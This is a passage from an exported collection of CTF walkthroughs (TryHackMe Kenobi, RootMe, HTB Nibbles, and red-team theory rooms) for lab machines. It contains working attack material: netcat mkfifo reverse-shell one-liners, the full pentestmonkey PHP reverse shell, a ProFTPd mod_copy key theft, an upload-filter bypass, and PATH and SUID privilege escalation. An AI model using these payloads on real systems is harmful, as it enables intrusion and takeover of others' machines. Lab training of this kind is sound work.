--script=nfs-ls,nfs-statfs,nfs-showmount 10.10.2.251\nPORT STATE SERVICE 111/tcp open rpcbind | nfs-ls: Volume /var | access: Read Lookup NoModify NoExtend NoDelete NoExecute | PERMISSION UID GID SIZE TIME FILENAME | rwxr-xr-x 0 0 4096 2019-09-04T08:53:24 . | rwxr-xr-x 0 0 4096 2019-09-04T12:27:33 .. | rwxr-xr-x 0 0 4096 2019-09-04T12:09:49 backups | rwxr-xr-x 0 0 4096 2019-09-04T10:37:44 cache | rwxrwxrwt 0 0 4096 2019-09-04T08:43:56 crash | rwxrwsr-x 0 50 4096 2016-04-12T20:14:23 local | rwxrwxrwx 0 0 9 2019-09-04T08:41:33 lock | rwxrwxr-x 0 108 4096 2019-09-04T10:37:44 log | rwxr-xr-x 0 0 4096 2019-01-29T23:27:41 snap | rwxr-xr-x 0 0 4096 2019-09-04T08:53:24 www |_ | nfs-showmount: |_ /var * | nfs-statfs: | Filesystem 1K-blocks Used Available Use% Maxfilesize Maxlink |_ /var 9204224.0 1836536.0 6877092.0 22% 16.0T 32000 MAC Address: 02:B9:E3:41:0F:B9 (Unknown) What mount can we see?\nAnswer: /var\nTask 3: Gain Initial Access with ProFtpd ‚ÄúProFtpd is a free and open-source FTP server, compatible with Unix and Windows systems. Its also been vulnerable in the past software versions.‚Äù - TryHackMe\nI start off with a NetCat banner grab.\nroot@ip-10-10-44-242:~# nc -vn 10.10.48.208 21 Connection to 10.10.48.208 21 port [tcp/*] succeeded! 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.48.208] Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP port. What is the version?\nAnswer: 1.3.5\nNow that I know the version of the software I can move to Searchsploit to see if there are any known exploits for this version of ProFTPD. This can be done in the terminal or in your browser which ever you are comfortable with, but I personally prefer the terminal.\nUsing specific terms will help narrow down Searchsploit results, but it can also hinder them. So I am always carful to start a wide search and then narrow it down to a more specific version or exploit type.\nHow many exploits are there for the ProFTPd running?\nAnswer: 4\nAfter finding which exploit to use I navigate to the file path provided in Searchsploit, read the exploit, and make sure it will fit my needs. In this case it does, but it is a little too indepth. So I use what the exploit is doing and apply it to my needs. Typically I would copy the exploit to a new file, but in this case I don‚Äôt need a separate exploit file at all.\nroot@ip-10-10-44-242:~# searchsploit -p 37262 Exploit: ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit) URL: https://www.exploit-db.com/exploits/37262 Path: /opt/exploitdb/exploits/linux/remote/37262.rb Codes: CVE-2015-3306, OSVDB-120834 Verified: True File Type: Ruby script, ASCII textcp /opt/exploitdb/exploits/linux/remote/37262.rb ~/DesktopReading the ProFTPD page for the mod_copy module. I see that I can use the commands SITE CPFR and SITE CPTO to copy Kenobi‚Äôs private ssh key to my tmp directory.\nWe know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user.\nAnswer: No answer needed\nroot@ip-10-10-184-203:~# nc 10.10.48.208 21 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.48.208] SITE CPFR /home/kenobi/.ssh/id_rsa 350 File or directory exists, ready for destination name SITE CPTO /var/tmp/id_rsa 250 Copy successful We knew that the /var directory was a mount we could see (task 2, question 4). So we‚Äôve now moved Kenobi‚Äôs private key to the /var/tmp directory.\nAnswer: No answer needed\nAfter copying the directory I mount it to my machine with:\nroot@ip-10-10-184-203:~/Downloads# mkdir /mnt/kenobiNFS root@ip-10-10-184-203:~/Downloads# mount 10.10.48.208:/var /mnt/kenobiNFSOnce mounted running an ls -lsa /mnt/kenobiNFS command will output the contents of the directory.\nNow I know we have the ssh key so all I have to do is copy the value to my local folder.\ncp /mnt/kenobiNFS/tmp/id_rsa .Adding a period or decimal in place of the destination will copy the file to the current working directory. After copying the value I set the permissions to read and write.\nsudo chmod 600 id_rsaOnce that is done all that‚Äôs left to do is log in as Kenobi.\nssh -i id_rsa kenobi@10.10.48.208\rOnce logged in you can cat the user flag.\nWhat is Kenobi‚Äôs user flag (/home/kenobi/user.txt)?\nAnswer: user.txt‚Äôs value.\nTask 4: Privilege Escalation with Path Variable Manipulation SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues.\nTo search the a system for these type of files run the following: find / -perm -u=s -type f 2\u003e/dev/null\nWhat file looks particularly out of the ordinary?\nAnswer: /usr/bin/menu\nRun the binary, how many options appear?\nAnswer: 3\nThe next step is not necessary for this machine, but I like to stay in practice by looking through everything I come across. So I ran the binary three times and selected each option to see what happened or if we could enumerate any additional information from them.\nYou do see that they are running with out using the full path of /usr/bin/curl, /usr/bin/uname, and /usr/bin/ifconfig.\nKnowing this will allow me to manipulate my path to elevate my privileges. First I cd into my tmp directory. Then I echo the path of a bash shell to my curl command, set it‚Äôs privileges, and set my path. Now I can run the binary to elevate to root.\nkenobi@kenobi:~$ cd /tmp kenobi@kenobi:/tmp$ echo /bin/sh \u003e curl kenobi@kenobi:/tmp$ chmod 777 curl kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH kenobi@kenobi:/tmp$ /usr/bin/menu\rWe copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the ‚Äúcurl‚Äù binary.. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root!\nAnswer: No answer needed.\nAll thats left is to cat your root flag at /root/root.txt.\nWhat is the root flag (/root/root.txt)?\nAnswer: root.txt‚Äôs value\nAnd that‚Äôs root! Happy Hacking!\n",
    "description": "Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation.",
    "tags": [
      "TryHackMe",
      "Samba",
      "proftpd",
      "SUID binary"
    ],
    "title": "Kenobi - TryHackMe",
    "uri": "/walkthroughs/kenobi/index.html"
  },
  {
    "breadcrumb": "Walkthroughs",
    "content": "\rDate written: April 2024 Date published: April 2024\nIntroduction Nibbles is a fairly simple machine, however with the inclusion of a login blacklist, it is a fair bit more challenging to find valid credentials. Luckily, a username can be enumerated and guessing the correct password should not take long.\nNibbles is a good starter or refresher machine too. As a note I did do this box in conjunction with HTB Academy‚Äôs Pentester Path. So some information may not be needed to complete the box, but its good to review.\nAs always you will want to connect to your HTB VPN or connect to Pwnbox. Once your connected lets get started with Nibbles!\nEnumeration I started by running an basic port scan on the box just to see what I could access. I also added the flags -sC to run a basic set of scripts on each open port and the -sV flag to identify the version of each service running.\nnmap -sV -sC $IP\nI saw that port 80 and port 22 were open and decided to do a little more recon on each port before diving into the website. First I ran netcat banner grab on each port. Then ran the nmap script http-enum.\nThe banner grab on port 22 did give me the SSH version, but port 80 did not yield anything. The nmap http-enu script did give me the same information for port 22, but also gave me the apache version of the web server.\nnc -nv 10.129.125.8 22 nc -nv 10.129.125.8 80 nmap -sV --script=http-enum 10.129.125.8\rAfter find that information I decided to give into the webpage. The initial webpage doesn‚Äôt give me much, but the source code does reveal a url I can navigate to http://$IP/nibbleblog.\nNavigating to /nibbleblog does not yield much either, but I decided to run a gobuster scan to see if there were any more urls I could utilize.\ngobuster dir -u http://10.129.125.8/nibbleblog/ --wordlist /usr/share/dirb/wordlists/common.txt\nAfter the scan completed I now have access to a handful of other directories. If this were an actual penetration test I would run gobuster/dirbuster/wfuzz/etc scan against each of those URLs as well as the main domain.\nThe above screenshot does not show the /nibbleblog/README page, but it is a common page I will check along with the siteslist and robots.txt pages. I ran a curl command on the README page and it revealed the nibbleblog version the site is running. It also says the content directory is writable. Navigating to /nibbleblog/content gives me a file directory.\ncurl http://10.129.125.8/nibbleblog/README\nAfter searching the file directory for a while I found the file users.xml. I opened the file by clicking the link, but the same can be achieved by using curl. The file contains the username admin. So now I have a username, but no login page, yet.\nI then went back to my gobuster results and navigated to the admin.php page, which is the log in page. I have the username of admin, but still need a password. My typical first password to guess is admin, but no luck. I then tried the name of the box and I was in.\nusername: admin password: nibbles\nInitial Foothold The first thing I notice on the page is the plugin directory, because plugin directories typically let you upload files. I start by crafting a reverse bash shell with in a php script. I use the Reverse Shell Generator, but my two favorite resources are HighOn.Coffee‚Äôs blog and PayloadAllTheThings\n\u003c?php system (\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc $IP $PORT \u003e/tmp/f\"); ?\u003e\nOnce I uploaded my shell I set up a netcat listener with nc -lvnp $IP $PORT using the same IP and port I specified in my shell.\nI then navigated to the directory where the image.php plug in is stored. /nibbleblog/content/private/plugins/my_images\nClick the image.php shell you created, go to your listener, and there should be a shell. Once I had a base shell I upgraded it with the following commands.\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\nNavigate to the /home/nibbler/user.txt file and cat your user flag!\nPrivilege Escalation In the nibbler directory there is also a file called personal.zip. I unzipped the file and saw that there is a script called monitor.sh which isn‚Äôt helpful at the moment. So I then started a python server on my host machine sudo python3 -m http.server $Port to transfer the LinEnum script to the victim machine.\nI saved the LinEnum script to my / directory. Back on the nibbler server I downloaded LinEnum with wget $IP/Path/To/LinEnum. The IP should be your IP not 0.0.0.0 like the python server terminal may show.\nOnce downloaded I changed the permissions of the file with chmod +x LinEnum.sh. Then ran the script with ./LinEnum.sh.\nAfter a while the script will finish and I found that the user nibbler can run the file /home/nibbler/personal/stuff/monitor.sh with root privileges. Now I know I can run the file, but what I really need is a shell, not to run the existing file. I wrote a bash script to the monitor.sh file and set up a new room listener.\necho 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u003e\u00261|nc $IP $PORT \u003e/tmp/f' | tee -a monitor.sh\nAfter the listener is set up I ran the monitor.sh file, which looks like it breaks or does nothing, but checking the listener says otherwise.\nWe have root! I then cat-ed /root/root.txt\n",
    "description": "Nibbles is a fairly simple machine, however with the inclusion of a login blacklist, it is a fair bit more challenging to find valid credentials. Luckily, a username can be enumerated and guessing the correct password does not take long for most.",
    "tags": [
      "HackTheBox",
      "Linux",
      "Web Application",
      "RCE"
    ],
    "title": "Nibbles - HTB",
    "uri": "/walkthroughs/nibbles/index.html"
  },
  {
    "breadcrumb": "Walkthroughs",
    "content": "\rDate written: January 2024 Date published: January 2024\nTask 1: Introduction Room objectives:\nUnderstand components and functions of a red team engagement. Learn how to properly plan an engagement based of needs and resources available and TTPs. Understand how to write engagement documentation in accordance to client objectives. Room prerequisites:\nNone Read the above and continue to the next task.\nAnswer: No answer needed\nTask 2: Defining Scope and Objectives Read the example client objectives and answer the questions below.\nAnswer: No answer needed.\nBelow is an example of the client objectives of a mature organization with a strong security posture.\nExample 1 - Global Enterprises:\nObjectives:\nIdentify system misconfigurations and network weaknesses. Focus on exterior systems. Determine the effectiveness of endpoint detection and response systems. Evaluate overall security posture and response. SIEM and detection measures. Remediation. Segmentation of DMZ and internal servers. Use of white cards is permitted depending on downtime and length. Evaluate the impact of data exposure and exfiltration. Scope:\nSystem downtime is not permitted under any circumstances. Any form of DDoS or DoS is prohibited. Use of any harmful malware is prohibited; this includes ransomware and other variations. xfiltration of PII is prohibited. Use arbitrary exfiltration data. Attacks against systems within 10.0.4.0/22 are permitted. Attacks against systems within 10.0.12.0/22 are prohibited. Bean Enterprises will closely monitor interactions with the DMZ and critical/production systems. Any interaction with ‚Äú*.bethechange.xyz‚Äù is prohibited. All interaction with ‚Äú*.globalenterprises.thm‚Äù is permitted. Answer: No answer needed\nWhat CIDR range is permitted to be attacked?\nAnswer: 10.0.4.0/22\nIs the use of white cards permitted? (Y/N)\nAnswer: Y\nLearn a little more about what white cards and are how they are used here, but it is essentially a simulated portion of the test to overcome limitations and allow continued testing.\nAre you permitted to access ‚Äú*.bethechange.xyz?‚Äù (Y/N)\nAnswer: N\nTask 3: Rules of Engagement Sections of Rules of Engagements or RoE:\nExecutive Summary Overarching summary of all contents and authorization within RoE document Purpose Defines why the RoE document is used References Any references used throughout the RoE document (HIPAA, ISO, etc.) Scope Statement of the agreement to restrictions and guidelines Definitions Definitions of technical terms used throughout the RoE document Rules of Engagement and Support Agreement Defines obligations of both parties and general technical expectations of engagement conduct Provisions Define exceptions and additional information from the Rules of Engagement Requirements, Restrictions, and Authority Define specific expectations of the red team cell Ground Rules Define limitations of the red team cell‚Äôs interactions Resolution of Issues/Points of Contact Contains all essential personnel involved in an engagement Authorization Statement of authorization for the engagement Approval Signatures from both parties approving all subsections of the preceding document Appendix Any further information from preceding subsections Download the sample rules of engagement from the task files. Once downloaded, read the sample document and answer the questions below.\nAnswer: No answer needed\nHow many explicit restriction are specified?\nAnswer: 3\nWhat is the first access type mentioned in the document?\nAnswer: Phishing\nIs the red team permitted to attack 192.168.1.0/24? (Y/N)\nAnswer: N\nTask 4: Campaign Planning Type of Plans:\nEngagement Plan An overarching description of technical requirements of the red team. CONOPS, Resource and Personnel Requirements, Timelines Operations Plan An expansion of the Engagement Plan. Goes further into specifics of each detail. Operators, Known Information, Responsibilities, etc. Mission Plan The exact commands to run and execution time of the engagement. Commands to run, Time Objectives, Responsible Operator, etc. Remediation Plan Defines how the engagement will proceed after the campaign is finished. Report, Remediation consultation, etc. Read the above and move on to engagement documentation.\nAnswer: No answer needed\nTask 5: Engagement Documentation After learning about the types of documentation the next few tasks will have you read the documentation and answer questions about them to ensure you understand what to look for.\nRead the above and move on to the upcoming engagement specific tasks.\nAnswer: No answer needed\nTask 6: Concept of Operations Read the example CONOP (Concept of Operation) and answer the questions below.\nAnswer: No answer needed\nBased on customer security posture and maturity, the TTP of the threat group: FIN6, will be employed throughout the engagement.\nAnswer: No answer needed\nHow long will the engagement last?\nAnswer: 1 month\nHow long is the red cell expected to maintain persistence?\nAnswer: 3 weeks\nWhat is the primary tool used within the engagement?\nAnswer: Cobalt Strike\nTask 7: Resource Plan Navigate to the ‚ÄúView Site‚Äù button and read the provided resource plan. Once complete, answer the questions below.\nAnswer: No answer needed,\nWhen will the engagement end? (MM/DD/YYYY)\nAnswer: 11/14/2021\nWhat is the budget the red team has for AWS cloud cost?\nAnswer: $1000\nAre there any miscellaneous requirements for the engagement? (Y/N)\nAnswer: N\nTask 8: Operations Plan Navigate to the ‚ÄúView Site‚Äù button and read the provided operations plan. Once complete, answer the questions below.\nAnswer: No answer needed.\nWhat phishing method will be employed during the initial access phase?\nAnswer: spearphishing\nWhat site will be utilized for communication between the client and red cell?\nAnswer: vectr.io\nIf there is a system outage, the red cell will continue with the engagement. (T/F)\nAnswer: F\nTask 9: Mission Plan Navigate to the ‚ÄúView Site‚Äù button and read the provided mission plan. Once complete, answer the questions below.\nAnswer: No answer needed\nWhen will the phishing campaign end? (mm/dd/yyyy)\nAnswer: 10/23/2021\nAre you permitted to attack 10.10.6.78? (Y/N)\nAnswer: N\nWhen a stopping condition is encountered, you should continue working and determine the solution yourself without a team lead. (T/F)\nAnswer: F\nTask 10: Conclusion Read the above and continue learning!\nAnswer: No answer needed\n",
    "description": "Learn the steps and procedures of a red team engagement, including planning, frameworks, and documentation.",
    "tags": [
      "TryHackMe",
      "Red Team"
    ],
    "title": "Red Team Engagements - TryHackMe",
    "uri": "/walkthroughs/red-team-engagements/index.html"
  },
  {
    "breadcrumb": "Walkthroughs",
    "content": "\rDate written: January 2024 Date published: January 2024\nTask 1: Introduction Room objectives:\nLearn about the basics of red team engagements Identify the main components and stakeholders involved in a red team engagement Understand the main differences between red teaming and other types of cybersecurity engagements Room prerequisites:\nBefore beginning this room, familiarity with general hacking techniques is required. Although not strictly necessary, completing the Jr. Penetration Tester Learning Path is recommended. Click to continue to the next task\nAnswer: No answer needed\nTask 2: Vulnerability Assessment and Penetration Tests Limitations Vulnerability Assessments:\nThe simplest form of security assessment. Main goal is to identify as many vulnerabilities as possible. May not discover active attacks/attackers. Mostly done with automated tools. Little technical knowledge needed. Does not exploit any of the vulnerabilities. Penetration Tests:\nScanning for vulnerabilities and then exploiting them. Need to understand how vulnerabilities impact the network as a whole. So you need to understand how the network works as a whole. Post exploitation steps are also used to gain additional useful knowledge that could allow for additional exploits. Will be able to detect real attack paths an attacker could take. Can be a ‚Äúloud‚Äù test. Would vulnerability assessments prepare us to detect a real attacker on our networks? (Yay/Nay)\nAnswer: Nay\nDuring a penetration test, are you concerned about being detected by the client? (Yay/Nay)\nAnswer: Nay\nHighly organised groups of skilled attackers are nowadays referred to as ‚Ä¶\nAnswer: Advanced Persistent Threats\nTask 3: Red Team Engagements Red Team Engagements:\nStarts with clear and defined goals. Tests the defensive (blue) team‚Äôs capabilities at detecting and responding to a real attack(er). The key is to remain undetected and not perform any ‚Äúloud‚Äù testing. TTP simulation. Can run in several ways. Full engagement, assumed breach, and a table top exercise. The goals of a red team engagement will often be referred to as flags or‚Ä¶\nAnswer: crown jewels\nDuring a red team engagement, common methods used by attackers are emulated against the target. Such methods are usually called TTPs. What does TTP stand for?\nAnswer: Tactics, Techniques and Procedures\nThe main objective of a red team engagement is to detect as many vulnerabilities in as many hosts as possible (Yay/Nay)\nAnswer: Nay\nTask 4: Teams and Functions of an Engagement Teams or cells:\nRed cell - the component that makes up the offensive portion of a red team engagement that simulates a given target‚Äôs strategic and tactical responses. Red Team Lead - Plans and organizes engagements at a high level‚Äîdelegates, assistant lead, and operators engagement assignments. Red Team Assistant Lead - Assists the team lead in overseeing engagement operations and operators. Can also assist in writing engagement plans and documentation if needed. Red Team Operator - Executes assignments delegated by team leads. Interpret and analyze engagement plans from team leads. Blue cell - the opposite side of red. It includes all the components defending a target network. The blue cell is typically comprised of blue team members, defenders, internal staff, and an organization‚Äôs management. White cell - Serves as referee between red cell activities and blue cell responses during an engagement. Controls the engagement environment/network. Monitors adherence to the ROE. Coordinates activities required to achieve engagement goals. Correlates red cell activities with defensive actions. Ensures the engagement is conducted without bias to either side. Learn more here What cell is responsible for the offensive operations of an engagement?\nAnswer: Red cell\nWhat cell is the trusted agent considered part of?\nAnswer: White cell\nTask 5: Engagement Structure Reconnaissance:\nObtain information on the target Harvesting emails, OSINT Weaponization:\nCombine the objective with an exploit. Commonly results in a deliverable payload. Exploit with backdoor, malicious office document Delivery:\nHow will the weaponized function be delivered to the target Email, web, USB Exploitation:\nExploit the target‚Äôs system to execute code MS17-010, Zero-Logon, etc. Installation:\nInstall malware or other tooling Mimikatz, Rubeus, etc. Command \u0026 Control:\nControl the compromised asset from a remote central controller Empire, Cobalt Strike, etc. Actions on Objectives:\nAny end objectives: ransomware, data exfiltration, etc. Conti, LockBit2.0, etc. If an adversary deployed Mimikatz on a target machine, where would they be placed in the Lockheed Martin cyber kill chain?\nAnswer: Installation\nWhat technique‚Äôs purpose is to exploit the target‚Äôs system to execute code?\nAnswer: Exploitation\nTask 6: Overview of a Red Team Engagement Click the ‚ÄúView Site‚Äù button and follow the example engagement to get the flag\nAnswer: Click through the engagement site to find the flag.\nTask 7: Conclusion Read the above and continue learning!\nAnswer: No answer needed.\n",
    "description": "Learn about the basics of a red engagement, the main components and stakeholders involved, and how red teaming differs from other cyber security engagements.",
    "tags": [
      "TryHackMe",
      "Red Team",
      "Fundamentals"
    ],
    "title": "Red Team Fundamentals - TryHackMe",
    "uri": "/walkthroughs/red-team-fundamentals/index.html"
  },
  {
    "breadcrumb": "Walkthroughs",
    "content": "\rDate written: January 2025 Date published:\nIntroduction In this room, you will learn how to enumerate directories, exploit file upload vulnerabilities, craft reverse shells, and exploit SUID permissions misconfigurations.\nTask 1: Deploy the machine As always the first step to a TryHackMe room is to connect to either OpenVPN or AttackBox. If you have never connected to OpenVPN or AttackBox before try their respective rooms to for a tutorial on how to connect to each one.\nDeploy the machine\nAnswer: No answer needed\nTask 2: Reconnaissance Next if you want to use the commands in the walk through with out having to type in your IP every time you can set your IP using the below export command, but make sure to change ‚Äú10.10.10.10‚Äù to your target machine IP. After this is set most programs will take $IP as the variable you just set.\nIf you need to use a URL you can either set the variable again or type http://$IP in the command.\nexport IP=10.10.10.10\nAfter your connected to THM you can run an nmap scan on your host with nmap $IP. You only need to look at the most common 1000 ports right now so just a basic scan is fine.\nScan the machine, how many ports are open?\nAnswer: 2\nAfter a basic NMAP scan I like to run nmap -sC -sV $IP. This will run the default nmap scripting engine (nse) scripts (-sC) and then check for the service version (-sV) of each port. You can also specify the ports to scan with -p 22, 80. This saves scan time, because you already know, out of the top 1000 ports, only 22 and 80 are open.\nThis should also give you the answer for the next two questions.\nPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA) | 256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA) |_ 256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-title: HackIT - Home |_http-server-header: Apache/2.4.29 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel What version of Apache is running?\nAnswer: 2.4.29\nWhat service is running on port 22?\nAnswer: ssh\nFind directories on the web server using the GoBuster tool.\nAnswer: No answer needed\nThe next step is to use GoBuster to find a hidden directory. If you have never used Gobuster, HackerTarget does a great job at explaining how to use it. For this use case you can skip down to ‚ÄúGobuster DIR command‚Äù in the tutorial, but Gobuster does a lot of great things if you have time to read the full article.\nIf you don‚Äôt like GoBuster another tool to use is Dirbuster. HackerSploit has a great and quick video tutorial on how to use it. Dirbuster is great is you are not yet comfortable running a lot of things in the terminal, because it has a user interface.\nTo use GoBuster I like to start with just a common word list, below I chose /usr/share/dirb/wordlists/common.txt. You can use a word list from SecLists like Discovery/Web-Content/common.txt as well.\ngobuster dir -u http://$IP -w /usr/share/dirb/wordlists/common.txt\nTo use DirBuster there are a few additional setting you will need to be aware of, but first start the program by typing dirbuster into your terminal. First you will want to add in your target URL http://10.10.196.184, then specify a wordlist. I, again, used usr/share/dir/wordlists/common.txt You are only brute forcing directories for RootMe, so you want to make sure to uncheck all of the starting options except ‚ÄúBrute Force Dirs‚Äù at the bottom. Once all your options are set, click start.\nAfter the scan finishes, you may need to click stop or pause to stop the scan. Once stopped you can head over to the results tab to see the directories it found.\nRegardless of which scanning tool you chose lets take a look at the directories they found.\n/.htaccess (Status: 403) [Size: 278] /.hta (Status: 403) [Size: 278] /.htpasswd (Status: 403) [Size: 278] /css (Status: 301) [Size: 312] [--\u003e http://10.10.196.184/css/] /index.php (Status: 200) [Size: 616] /js (Status: 301) [Size: 311] [--\u003e http://10.10.196.184/js/] /panel (Status: 301) [Size: 314] [--\u003e http://10.10.196.184/panel/] /server-status (Status: 403) [Size: 278] /uploads (Status: 301) [Size: 316] [--\u003e http://10.10.196.184/uploads/]Before navigation to the directories I like to understand what each browser status code means.\n403 means that page is forbidden so you know that you cannot acces any of the pages with a 403 status. Next is 301 which is the interesting status in our case. This means that the page has moved, but what happens if you navigate to the /panel page.\nIt should bring you to an page that allows uploads.\nWhat is the hidden directory?\nAnswer: /panel/\nTask 3: Getting a shell The first thing I think of is can you upload a reverse shell? Spoiler: the answer is yes, but what file extensions does the server accept?\nAfter some trial and error I found that it accepts .sh, but nothing happened. It also would not allow .php files, but from previous experience I know there are several different php file extensions - .php, .php3, .php4, .php5, .php7, and .php8. With each of these you can also change their case to capitalize all or a portion of the extensions. Sometimes that will allow you to get around an extension block.\nAfter a little research and trial and error you should find that .php5 is an allowed upload. Now you can craft your shell.\nFor shells I like to use Reverse Shell Generator. It has a list of prebuilt reverse, blind, MSFVenom, and Hoax Shells. Once on that page, first input your personal host IP and listening port. I tend to use 1234 as my listening port, but you can choose any port you‚Äôd like as long as it is not in use on your machine. Then scroll down or search until you PHP PentestMonkey download or copy and paste the shell into a file. Save the file something like shell.php5.\n\u003c?php // php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php // Copyright (C) 2007 pentestmonkey@pentestmonkey.net set_time_limit (0); $VERSION = \"1.0\"; $ip = '10.10.10.10'; $port = 1234; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = 'uname -a; w; id; sh -i'; $daemon = 0; $debug = 0; if (function_exists('pcntl_fork')) { $pid = pcntl_fork(); if ($pid == -1) { printit(\"ERROR: Can't fork\"); exit(1); } if ($pid) { exit(0); // Parent exits } if (posix_setsid() == -1) { printit(\"Error: Can't setsid()\"); exit(1); } $daemon = 1; } else { printit(\"WARNING: Failed to daemonise. This is quite common and not fatal.\"); } chdir(\"/\"); umask(0); // Open reverse connection $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit(\"$errstr ($errno)\"); exit(1); } $descriptorspec = array( 0 =\u003e array(\"pipe\", \"r\"), // stdin is a pipe that the child will read from 1 =\u003e array(\"pipe\", \"w\"), // stdout is a pipe that the child will write to 2 =\u003e array(\"pipe\", \"w\") // stderr is a pipe that the child will write to ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(\"ERROR: Can't spawn shell\"); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(\"Successfully opened reverse shell to $ip:$port\"); while (1) { if (feof($sock)) { printit(\"ERROR: Shell connection terminated\"); break; } if (feof($pipes[1])) { printit(\"ERROR: Shell process terminated\"); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit(\"SOCK READ\"); $input = fread($sock, $chunk_size); if ($debug) printit(\"SOCK: $input\"); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit(\"STDOUT READ\"); $input = fread($pipes[1], $chunk_size); if ($debug) printit(\"STDOUT: $input\"); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit(\"STDERR READ\"); $input = fread($pipes[2], $chunk_size); if ($debug) printit(\"STDERR: $input\"); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) { if (!$daemon) { print \"$string\\n\"; } } ?\u003e Now you can upload your shell to the /panel page. To verify it has been successfully uploaded browse to http://ATTACKIP/uploads. You should see your upload there.\nIn your terminal set up a listener. This will be the same port you specified in your shell.\nnc -lvnp 1234\nNow that your listener is set up, you can either click on your shell in the /uploads directory or curl the shell like the below.\ncurl http://10.10.196.184/uploads/shell.php5 You should get a connection. Now that you have a connection I like to upgrade my shell a little with the following commands.\ncat /etc/shells will tell you which shells are available. If you want to use a specific shell.\npython --version will tell you which python version, if any, is available on the host. In our case it‚Äôs python 2.\npython2 -c 'import pty;pty.spawn(\"/bin/bash\")' This will upgrade our basic shell into a bash shell.\nThe next thing to do is to find and cat the user flag.\nfind / -type f -name user.txt 2\u003e /dev/null\nOne of my favorite websites is explainshell.com. Try typing in the above command to learn what it does.\ncat /var/www/user.txt\nuser.txt\nAnswer: cat /var/www/user.txt\nTask 4: Privilege escalation The first task asks you to search for files with SUID permissions. You can do this with the following find command find / -perm -u=s -type f 2\u003e/dev/null. This searches all files where the current user can execute the file as if they were the owner, even if that file owner is root.\nNow you can look through this list to see which file looks out of the ordinary.\nSearch for files with SUID permission, which file is weird?\nAnswer: /usr/bin/python\nFind a form to escalate your privileges.\nAnswer: No answer needed\nNext you can use GTFOBins to find the correct bypass for python.\nSince you know python is already installed you can skip the first line in GTFOBins. Remember to specify your path and you should be able to escalate to root.\n./usr/bin/python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'Once you are root all that is left to do is find (find / -type f -name root.txt) and cat (cat /root/root.txt ) the flag.\ncat /root/root.txt root.txt\nAnswer: cat root.txt\n",
    "description": "A ctf for beginners, can you root me?",
    "tags": [
      "TryHackMe",
      "ctf"
    ],
    "title": "RootMe - TryHackMe",
    "uri": "/walkthroughs/rootme/index.html"
  },
  {
    "breadcrumb": "Walkthroughs",
    "content": "\rDate written: December 2023 Date published: December 2023\nTask 1: Introduction ‚ÄúIn this room you will enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.‚Äù - TryHackMe.\nAs always the first step to a TryHackMe room is to connect to either OpenVPN or AttackBox. I am going to use my own Kali virtual machine with OpenVPN for this room. If you have never connected to OpenVPN before see TryHackMe‚Äôs room on how to connect.\nOnce the machine is deployed I read the first question and did, what I thought to be, the most logical option - open the machines IP in a web browser.\nSuccess, there is a web page tied to this machine. The web page has an image of Steel Mountain‚Äôs Employee of the Month and not much else. If you right click and select ‚Äúinspect‚Äù the browser will bring up the developer tools and show the source code. The same thing can be achieved by selecting ‚ÄúCtrl + U‚Äù on your keyboard. This will open the source code in a new window instead of the same window.\nOnce the source code is displayed I see that the image is titled BillHarper.png, leading me to believe the employees name is Bill Harper.\nDeploy the machine. Who is the employee of the month?\nAnswer: Bill Harper\nTask 2 Initial Access Next I‚Äôll run a basic NMAP scan on the machine nmap 10.10.14.216.\n‚îå‚îÄ‚îÄ(kali„âøkali)-[~] ‚îî‚îÄ$ nmap 10.10.14.216 Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-25 22:54 EST Nmap scan report for 10.10.14.216 Host is up (0.16s latency). Not shown: 989 closed tcp ports (conn-refused) PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3389/tcp open ms-wbt-server 8080/tcp open http-proxy 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49155/tcp open unknown 49156/tcp open unknown\rSo I see that the 